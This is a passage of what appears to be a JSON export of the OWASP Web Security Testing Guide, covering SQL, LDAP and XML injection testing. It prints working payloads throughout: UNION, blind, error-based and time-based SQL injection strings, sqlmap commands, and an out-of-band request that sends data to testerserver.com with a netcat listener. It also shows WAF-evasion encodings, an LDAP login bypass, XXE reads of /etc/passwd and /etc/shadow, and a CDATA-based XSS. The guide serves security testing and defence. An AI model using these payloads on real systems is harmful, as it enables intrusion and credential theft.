Because you are modifying theWHEREsection. In fact, you are not appending aUNIONquery to the original query.</li><li>Solution:You need to know the query which gets executed in the backend. Then, create your payload based on that. It means closing open parentheses or adding proper keywords if needed.</li></ul><p>Scenario 2 The vulnerable query contains aliases or variable declarations.</p><br><pre><code>SELECT \n  s1.user_id, \n  (                                                                                      --\\\n    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query\n  ) AS overlap                                                                           --/\nFROM \n  subscriptions AS s1 \n  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id \n  AND s1.start_date <= s2.end_date \n  AND s1.end_date >= s2.start_date \nGROUP BY \n  s1.user_id</code></pre><ul><li>Problem:You break the query when you comment the rest of the original query after your injected payload because some aliases or variables becomeundefined.</li><li>Solution:You need to put appropriate keywords or aliases at the beginning of your payload. this way the first part of the original query stays valid.</li></ul><p>Scenario 3 The result of the vulnerable query is being used in a second query. The second query returns the data, not the first one.</p><br><pre><code><?php\n// retrieves product ID based on product name\n                            --\\\n$query1 = \"SELECT              |\n             id                |\n           FROM                |\n             products          |--> vulnerable query #1\n           WHERE               |\n             name = '$name'\";  |\n                            --/\n$result1 = odbc_exec($conn, $query1);\n// retrieves product's comments based on the product ID\n                              --\\\n$query2 = \"SELECT                |\n             comments            |\n           FROM                  |\n             products            |--> vulnerable query #2\n           WHERE                 |\n             id = '$result1'\";   |\n                              --/\n$result1 = odbc_exec($conn, $query2);\n?></code></pre><ul><li>Problem:You can add aUNIONpayload to the first query but it won’t affect the returned data.</li><li>solution:You need to inject in the second query. So the input to the second query should not get sanitized. Then, you need to make the first query return no data. Now append aUNIONquery that returns the payload you want to inject in thesecond query.Example:The base of the payload (what you inject in the first query):' AND 1 = 2 UNION SELECT \"PAYLOAD\" -- -ThePAYLOADis what you want to inject in thesecond query:' AND 1=2 UNION SELECT ...The final payload (after replacing thePAYLOAD):' AND 1 = 2 UNION SELECT \"' AND 1=2 UNION SELECT ...\" -- -\n                          \\________________________/\n                                      ||\n                                      \\/\n                               the payload that\n                                get's injected\n                             into the second query\n\\________________________________________________________/\n                            ||\n                            \\/\n the actual query we inject into the vulnerable parameterThe first query after injection:SELECT               --\\\n  id                    |\nFROM                    |----> first query\n  products              |\nWHERE                   |\n  name = 'abcd'      --/\n  AND 1 = 2                                 --\\\nUNION                                          |----> injected payload (what gets injected into the second payload)\nSELECT                                         |\n  \"' AND 1=2 UNION SELECT ... -- -\" -- -'   --/The second query after injection:SELECT            --\\\n  comments           |\nFROM                 |----> second query\n  products           |\nWHERE                |\n  id = ''         --/\n  AND 1 = 2         --\\ \nUNION                  |----> injected payload (the final UNION query that controls the returned data)\nSELECT ... -- -'    --/</li></ul><p>solution: You need to inject in the second query. So the input to the second query should not get sanitized. Then, you need to make the first query return no data. Now append a UNION query that returns the payload you want to inject in the second query .</p><p>Example: The base of the payload (what you inject in the first query):</p><br><pre><code>' AND 1 = 2 UNION SELECT \"PAYLOAD\" -- -</code></pre><p>The PAYLOAD is what you want to inject in the second query :</p><pre><code>' AND 1=2 UNION SELECT ...</code></pre><p>The final payload (after replacing the PAYLOAD ):</p><pre><code>' AND 1 = 2 UNION SELECT \"' AND 1=2 UNION SELECT ...\" -- -\n                          \\________________________/\n                                      ||\n                                      \\/\n                               the payload that\n                                get's injected\n                             into the second query\n\\________________________________________________________/\n                            ||\n                            \\/\n the actual query we inject into the vulnerable parameter</code></pre><p>The first query after injection:</p><pre><code>SELECT               --\\\n  id                    |\nFROM                    |----> first query\n  products              |\nWHERE                   |\n  name = 'abcd'      --/\n  AND 1 = 2                                 --\\\nUNION                                          |----> injected payload (what gets injected into the second payload)\nSELECT                                         |\n  \"' AND 1=2 UNION SELECT ... -- -\" -- -'   --/</code></pre><p>The second query after injection:</p><pre><code>SELECT            --\\\n  comments           |\nFROM                 |----> second query\n  products           |\nWHERE                |\n  id = ''         --/\n  AND 1 = 2         --\\ \nUNION                  |----> injected payload (the final UNION query that controls the returned data)\nSELECT ... -- -'    --/</code></pre><p>Scenario 4 The vulnerable parameter is being used in several independent queries.</p><br><pre><code><?php\n//retrieving product details based on product ID\n$query1 = \"SELECT \n             name, \n             inserted, \n             size \n           FROM \n             products \n           WHERE \n             id = '$id'\";\n$result1 = odbc_exec($conn, $query1);\n//retrieving product comments based on the product ID\n$query2 = \"SELECT \n             comments \n           FROM \n             products \n           WHERE \n             id = '$id'\";\n$result2 = odbc_exec($conn, $query2);\n?></code></pre><ul><li>Problem:Appending aUNIONquery to the first (or second) query doesn’t break it, but it may break the other one.</li><li>Solution:It depends on the code structure of the application. But the first step is to know the original query. Most of the time, these injections are time-based. Also, the time-based payload gets injected in several queries which can be problematic.For example, if you useSQLMap, this situation confuses the tool and the output gets messed up. Because the delays will not be as expected.</li></ul><br><p>Extracting Original Query As you see, knowing the original query is always needed to achieve a union-based injection. You can retrieve the original query using the default DBMS tables:</p><br><br><p>Automation Steps to automate the workflow:</p><br><ul><li>Specifying acustom injection point marker(*)</li><li>Using--prefixand--suffixflags.</li></ul><p>Example: Consider the third scenario discussed above. We assume the DMBS is MySQL and the first and second queries return only one column.\nThis can be your payload for extracting the version of the database:</p><br><br><pre><code>' AND 1=2 UNION SELECT \" ' AND 1=2 UNION SELECT @@version -- -\" -- -</code></pre><p>So the target URL would be like this:</p><pre><code>https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+\"+'AND 1=2+UNION+SELECT+@@version+--+-\"+--+-</code></pre><p>Automation:</p><ul><li>custom injection point marker(*):sqlmap -u \"https://example.org/search?query=abcd'AND 1=2 UNION SELECT \\\"*\\\"-- -\"</li><li>--prefixand--suffixflags:sqlmap -u \"https://example.org/search?query=abcd\" --prefix=\"'AND 1=2 UNION SELECT \\\"\" --suffix=\"\\\"-- -\"</li></ul><p>custom injection point marker ( * ):</p><pre><code>sqlmap -u \"https://example.org/search?query=abcd'AND 1=2 UNION SELECT \\\"*\\\"-- -\"</code></pre><p>--prefix and --suffix flags:</p><pre><code>sqlmap -u \"https://example.org/search?query=abcd\" --prefix=\"'AND 1=2 UNION SELECT \\\"\" --suffix=\"\\\"-- -\"</code></pre><p>The Boolean exploitation technique is very useful when the tester finds a Blind SQL Injection situation, in which nothing is known about the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything about the structure of the query or the database. (The page does not return a SQL error, it may just return an HTTP 500, 404, or redirect).</p><p>By using inference methods, it is possible to avoid this obstacle and thus succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers, and finally deducing the meaning of such answers. We consider, as always, the www.example.com domain and we suppose that it contains a parameter named id vulnerable to SQL injection. This means that when carrying out the following request:</p><p>https://www.example.com/index.php?id=1'</p><p>We will get one page with a custom error message which is due to a syntactic error in the query. We suppose that the query executed on the server is:</p><p>SELECT field1, field2, field3 FROM Users WHERE Id='$Id'</p><p>Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our example, we will use the following pseudo-functions:</p><ul><li>SUBSTRING (text, start, length): returns a substring starting from the position “start” of text and length “length”. If “start” is greater than the length of text, the function returns a null value.</li><li>ASCII (char): it gives back the ASCII value of the input character. A null value is returned if char is 0.</li><li>LENGTH (text): it gives back the number of characters in the input text.</li></ul><p>SUBSTRING (text, start, length): returns a substring starting from the position “start” of text and length “length”. If “start” is greater than the length of text, the function returns a null value.</p><p>ASCII (char): it gives back the ASCII value of the input character. A null value is returned if char is 0.</p><p>LENGTH (text): it gives back the number of characters in the input text.</p><p>Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass it to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, to select only one character at a time (selecting a single character means imposing the length parameter to 1), and the function ASCII, to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table until the right value is found. As an example, we will use the following value for Id :</p><p>$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1</p><p>That creates the following query (from now on, we will call it “inferential query”):</p><p>SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'</p><p>The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set the index of the ASCII table to zero and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for Id :</p><p>$Id=1' AND '1' = '2</p><p>Which will create the following query:</p><p>SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'</p><p>The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates to decide the result of the test.</p><p>In the previous discussion, we haven’t dealt with the problem of determining the termination condition for our tests, i.e. when we should end the inference procedure. A technique to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e. the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.</p><p>We will insert the following value for the field Id :</p><p>$Id=1' OR LENGTH(username)=N AND '1' = '1</p><p>Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:</p><p>SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'</p><p>The query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.</p><p>The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.</p><p>An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other techniques such as UNION. The Error-based technique consists of forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).</p><p>Consider the following SQL query:</p><p>SELECT * FROM products WHERE id_product=$id_product</p><p>Consider also the request to a script that executes the query above:</p><p>https://www.example.com/product.php?id=10</p><p>The malicious request would be (e.g. Oracle 10g):</p><p>https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--</p><p>In this example, the tester is concatenating the value 10 with the result of the function UTL_INADDR.GET_HOST_NAME . This Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:</p><p>ORA-292257: host SCOTT unknown</p><p>Then the tester can manipulate the parameter passed to the GET_HOST_NAME() function and the result will be shown in the error message.</p><p>This technique is very useful when the tester finds a Blind SQL Injection situation, in which nothing is known about the outcome of an operation. The technique consists of the use of DBMS functions to perform an out-of-band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error-based techniques, each DBMS has its functions. Check for specific DBMS sections.</p><p>Consider the following SQL query:</p><p>SELECT * FROM products WHERE id_product=$id_product</p><p>Consider also the request to a script that executes the query above:</p><p>https://www.example.com/product.php?id=10</p><p>The malicious request would be:</p><p>https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--</p><p>In this example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request . This Oracle function will try to connect to testerserver and make an HTTP GET request containing the return from the query SELECT user FROM DUAL . The tester can set up a web server (e.g. Apache) or use the Netcat tool:</p><pre><code>/home/tester/nc –nLp 80\n\nGET /SCOTT HTTP/1.1\nHost: testerserver.com\nConnection: close</code></pre><p>The time delay exploitation technique is very useful when the tester finds a Blind SQL Injection situation, in which nothing is known about the outcome of an operation. This technique consists of sending an injected query and in case the conditional is true, the tester can monitor the time taken for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).</p><p>Consider the following SQL query:</p><p>SELECT * FROM products WHERE id_product=$id_product</p><p>Consider also the request to a script that executes the query above:</p><p>https://www.example.com/product.php?id=10</p><p>The malicious request would be (e.g. MySql 5.x):</p><p>https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--</p><p>In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.</p><p>When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.</p><p>Consider the following SQL Server Stored Procedure:</p><pre><code>Create procedure user_login @ username varchar ( 20 ), @ passwd varchar ( 20 ) As Declare @ sqlstring varchar ( 250 ) Set @ sqlstring = ‘ Select 1 from users Where username = ‘ + @ username + ‘ and passwd = ‘ + @ passwd exec ( @ sqlstring ) Go</code></pre><p>User input:</p><pre><code>anyusername or 1 = 1 '\nanypassword</code></pre><p>This procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.</p><p>This example may seem unlikely due to the use of dynamic SQL to log in a user but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.</p><p>Consider the following SQL Server Stored Procedure:</p><pre><code>Create procedure get_report @ columnamelist varchar ( 7900 ) As Declare @ sqlstring varchar ( 8000 ) Set @ sqlstring = ‘ Select ‘ + @ columnamelist + ‘ from ReportTable ‘ exec ( @ sqlstring ) Go</code></pre><p>User input:</p><pre><code>1 from users ; update users set password = 'password' ; select *</code></pre><p>This will result in the report running and all users’ passwords being updated.</p><p>Most of the situations and techniques presented here can be performed in an automated way using some tools. In this article, the tester can find information on how to perform automated auditing using SQLMap</p><p>The techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs). Also refer to https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF</p><p>Dropping space or adding spaces that won’t affect the SQL statement. For example</p><pre><code>or 'a' = 'a' or 'a' = 'a'</code></pre><p>Adding special characters like a new line or tab that won’t change the SQL statement execution. For example,</p><pre><code>or 'a' = 'a'</code></pre><p>Use null byte (%00) before any characters that the filter is blocking.</p><p>For example, if the attacker may inject the following SQL</p><p>' UNION SELECT password FROM Users WHERE username='admin'--</p><p>to add Null Bytes will be</p><p>%00' UNION SELECT password FROM Users WHERE username='admin'--</p><p>Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as an example.</p><p>' UNION SELECT password FROM Users WHERE name='admin'--</p><p>Adding SQL inline comments will be:</p><p>'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--</p><p>'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--</p><p>Use the online URL encoding to encode the SQL statement</p><p>' UNION SELECT password FROM Users WHERE name='admin'--</p><p>The URL encoding of the SQL injection statement will be</p><p>%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--</p><p>Char() function can be used to replace English char. For example, char(114,111,111,116) means root</p><p>' UNION SELECT password FROM Users WHERE name='root'--</p><p>To apply the Char(), the SQL injection statement will be</p><p>' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--</p><p>Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on the database engine. Take the MS SQL engine as an example</p><p>select 1</p><p>The simple SQL statement can be changed as below by using concatenation</p><p>EXEC('SEL' + 'ECT 1')</p><p>Hex encoding technique uses Hexadecimal encoding to replace the original SQL statement char. For example, root can be represented as 726F6F74</p><p>Select user from users where name = 'root'</p><p>The SQL statement by using the HEX value will be:</p><p>Select user from users where name = 726F6F74</p><p>or</p><p>Select user from users where name = unhex('726F6F74')</p><p>Declare the SQL injection statement into a variable and execute it.</p><p>For example, the SQL injection statement below</p><p>Union Select password</p><p>Define the SQL statement into the variable SQLivar</p><pre><code>; declare @ SQLivar nvarchar ( 80 ); set @ myvar = N 'UNI' + N 'ON' + N ' SELECT' + N 'password' ); EXEC ( @ SQLivar )</code></pre><pre><code>OR 'SQLi' = 'SQL' + 'i' OR 'SQLi' & gt ; 'S' or 20 & gt ; 1 OR 2 between 3 and 1 OR 'SQLi' = N 'SQLi' 1 and 1 = 1 1 || 1 = 1 1 && 1 = 1</code></pre><p>Most SQL dialects support both single-character wildcards (usually “ ? ” or “ _ ”) and multi-character wildcards (usually “ % ” or “ * ”), which can be used in queries with the LIKE operator. Even when appropriate controls (such as parameters or prepared statements) are used to protect against SQL injection attacks, it may be possible to inject wildcards into queries.</p><p>For example, if a web application allows users to enter a discount code as part of the checkout process, and it checks whether this code exists in the database using a query such as SELECT * FROM discount_codes WHERE code LIKE ':code' , then entering a value of % (which would be inserted in place of the :code parameter) would match all of the discount codes.</p><p>This technique could also be used to determine exact discount codes through increasingly specific queries (such as a% , b% , ba% , etc).</p>",
        "tools": "<h3>Tools</h3><ul><li>SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb</li><li>Bernardo Damele A. G.: sqlmap, automatic SQL injection tool</li><li>Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool</li><li>SQL Injection - PayloadsAllTheThings</li></ul><h3>References</h3><ul><li>Top 10 2017-A1-Injection</li><li>SQL Injection</li><li>SQL Injection</li></ul><p>Technology-specific Testing Guide pages have been created for the following DBMSs:</p><ul><li>Oracle</li><li>MySQL</li><li>SQL Server</li><li>PostgreSQL</li><li>MS Access</li><li>NoSQL</li><li>ORM</li><li>Client-side</li></ul><ul><li>Victor Chapela: “Advanced SQL Injection”</li><li>Chris Anley: “More Advanced SQL Injection”</li><li>David Litchfield: “Data-mining with SQL Injection and Inference”</li><li>Imperva: “Blinded SQL Injection”</li><li>PortSwigger: “SQL Injection Cheat Sheet”</li><li>Kevin Spett from SPI Dynamics: “Blind SQL Injection”</li><li>“ZeQ3uL” (Prathan Phongthiproek) and “Suphot Boonchamnan”: “Beyond SQLi: Obfuscate and Bypass”</li><li>Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: “The Latest SQL Injection Trends”</li></ul><ul><li>Anatomy of the SQL injection in Drupal’s database comment filtering system SA-CORE-2015-003</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>To secure the application from SQL injection vulnerabilities, refer to theSQL Injection Prevention CheatSheet.</li><li>To secure the SQL server, refer to theDatabase Security CheatSheet.</li></ul><p>For generic input validation security, refer to the Input Validation CheatSheet .</p>",
        "test_objectives": ""
    },
    "WSTG-INPV-06": {
        "summary": "<h3>Summary</h3><p>The Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and many other objects. LDAP injection is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by manipulating input parameters afterwards passed to internal search, add, and modify functions.</p><p>A web application could use LDAP in order to let users authenticate or search other users’ information inside a corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application.</p><p>Rfc2254 defines a grammar on how to build a search filter on LDAPv3 and extends Rfc1960 (LDAPv2).</p><p>An LDAP search filter is constructed in Polish notation, also known as Polish notation prefix notation .</p><p>This means that a pseudo code condition on a search filter like this:</p><p>find(\"cn=John & userPassword=mypass\")</p><p>will be represented as:</p><p>find(\"(&(cn=John)(userPassword=mypass))\")</p><p>Boolean conditions and group aggregations on an LDAP search filter could be applied by using the following metacharacters:</p><p>More complete examples on how to build a search filter can be found in the related RFC.</p><p>A successful exploitation of an LDAP injection vulnerability could allow the tester to:</p><ul><li>Access unauthorized content</li><li>Evade application restrictions</li><li>Gather unauthorized information</li><li>Add or modify Objects inside LDAP tree structure</li></ul><h3>Test Objectives</h3><ul><li>Identify LDAP injection points.</li><li>Assess the severity of the injection.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Let’s suppose we have a web application using a search filter like the following one:</p><p>searchfilter=\"(cn=\"+user+\")\"</p><p>which is instantiated by an HTTP request like this:</p><p>https://www.example.com/ldapsearch?user=John</p><p>If the value John is replaced with a * , by sending the request:</p><p>https://www.example.com/ldapsearch?user=*</p><p>the filter will look like:</p><p>searchfilter=\"(cn=*)\"</p><p>which matches every object with a ‘cn’ attribute equals to anything.</p><p>If the application is vulnerable to LDAP injection, it will display some or all of the user’s attributes, depending on the application’s execution flow and the permissions of the LDAP connected user.</p><p>A tester could use a trial-and-error approach, by inserting in the parameter ( , | , & , * and the other characters, in order to check the application for errors.</p><p>If a web application uses LDAP to check user credentials during the login process and it is vulnerable to LDAP injection, it is possible to bypass the authentication check by injecting an always true LDAP query (in a similar way to SQL and XPATH injection ).</p><p>Let’s suppose a web application uses a filter to match LDAP user/password pair.</p><p>searchlogin= \"(&(uid=\"+user+\")(userPassword={MD5}\"+base64(pack(\"H*\",md5(pass)))+\"))\";</p><p>By using the following values:</p><pre><code>user=*)(uid=*))(|(uid=*\npass=password</code></pre><p>the search filter will results in:</p><p>searchlogin=\"(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\";</p><p>which is correct and always true. This way, the tester will gain logged-in status as the first user in LDAP tree.</p>",
        "tools": "<h3>Tools</h3><ul><li>Softerra LDAP Browser</li></ul><h3>References</h3><ul><li>LDAP Injection Prevention Cheat Sheet</li></ul><ul><li>Sacha Faust: LDAP Injection: Are Your Applications Vulnerable?</li><li>IBM paper: Understanding LDAP</li><li>RFC 1960: A String Representation of LDAP Search Filters</li><li>LDAP injection</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-07": {
        "summary": "<h3>Summary</h3><p>XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.</p><p>This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).</p><h3>Test Objectives</h3><ul><li>Identify XML injection points.</li><li>Assess the types of exploits that can be attained and their severities.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Let’s suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new user> node in an xmlDb file.</p><p>Let’s suppose the xmlDB file is like the following:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <userid> 0 </userid> <mail> [email protected] </mail> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> </users></code></pre><p>When a user registers himself by filling an HTML form, the application receives the user’s data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a GET request.</p><p>For example, the following values:</p><pre><code>Username: tony\nPassword: Un6R34kb!e\nE-mail: [email protected]</code></pre><p>will produce the request:</p><p>https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e& [email protected]</p><p>The application, then, builds the following node:</p><pre><code><user> <username> tony </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] </mail> </user></code></pre><p>which will be added to the xmlDB:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <userid> 0 </userid> <mail> [email protected] </mail> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> <user> <username> tony </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> </users></code></pre><p>The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.</p><p>XML metacharacters are:</p><ul><li>Single quote:'- When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.</li></ul><p>As an example, let’s suppose there is the following attribute:</p><p><node attrib='$inputValue'/></p><p>So, if:</p><p>inputValue = foo'</p><p>is instantiated and then is inserted as the attrib value:</p><p><node attrib='foo''/></p><p>then, the resulting XML document is not well formed.</p><ul><li>Double quote:\"- this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.</li></ul><p><node attrib=\"$inputValue\"/></p><p>So if:</p><p>$inputValue = foo\"</p><p>the substitution gives:</p><p><node attrib=\"foo\"\"/></p><p>and the resulting XML document is invalid.</p><ul><li>Angular parentheses:>and<- By adding an open or closed angular parenthesis in a user input like the following:</li></ul><p>Username = foo<</p><p>the application will build a new node:</p><pre><code><user> <username> foo < </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] </mail> </user></code></pre><p>but, because of the presence of the open ‘<’, the resulting XML document is invalid.</p><ul><li>Comment tag:<!--/-->- This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:</li></ul><p>Username = foo<!--</p><p>the application will build a node like the following:</p><pre><code><user> <username> foo <!--</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail> [email protected] </mail>\n</user></code></pre><p>which won’t be a valid XML sequence.</p><ul><li>Ampersand:&- The ampersand is used in the XML syntax to represent entities. The format of an entity is&symbol;. An entity is mapped to a character in the Unicode character set.</li></ul><p>For example:</p><p><tagnode>&lt;</tagnode></p><p>is well formed and valid, and represents the < ASCII character.</p><p>If & is not encoded itself with &amp; , it could be used to test XML injection.</p><p>In fact, if an input like the following is provided:</p><p>Username = &foo</p><p>a new node will be created:</p><pre><code><user> <username> & foo </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] </mail> </user></code></pre><p>but, again, the document is not valid: &foo is not terminated with ; and the &foo; entity is undefined.</p><ul><li>CDATA section delimiters:<!\\[CDATA\\[ / ]]>- CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.</li></ul><p>For example, if there is the need to represent the string <foo> inside a text node, a CDATA section may be used:</p><pre><code><node> <![CDATA[<foo>]]> </node></code></pre><p>so that <foo> won’t be parsed as markup and will be considered as character data.</p><p>If a node is created in the following way:</p><p><username><![CDATA[<$userName]]></username></p><p>the tester could try to inject the end CDATA string ]]> in order to try to invalidate the XML document.</p><p>userName = ]]></p><p>this will become:</p><p><username><![CDATA[]]>]]></username></p><p>which is not a valid XML fragment.</p><p>Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.</p><p>Let’s consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.</p><pre><code><html> $HTMLCode </html></code></pre><p>Then, an attacker can provide the following input:</p><p>$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></p><p>and obtain the following node:</p><pre><code><html> <![CDATA[<]]> script <![CDATA[>]]> alert('xss') <![CDATA[<]]> /script <![CDATA[>]]> </html></code></pre><p>During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:</p><pre><code><script> alert ( ' XSS ' ) </script></code></pre><p>The result is that the application is vulnerable to XSS.</p><p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p><p>To test for XXE vulnerabilities, one can use the following input:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///dev/random\" > ]> <foo> &xxe; </foo></code></pre><p>This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.</p><p>Other useful tests are the following:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]> <foo> &xxe; </foo> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/shadow\" > ]> <foo> &xxe; </foo> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" > ]> <foo> &xxe; </foo> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"https://www.attacker.com/text.txt\" > ]> <foo> &xxe; </foo></code></pre><p>Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.</p><p>Let’s considering the previous application. By inserting the following values:</p><pre><code>Username: tony\nPassword: Un6R34kb!e\nE-mail: [email protected] </mail><userid>0</userid><mail> [email protected]</code></pre><p>the application will build a new node and append it to the XML database:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <userid> 0 </userid> <mail> [email protected] </mail> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> <user> <username> tony </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] 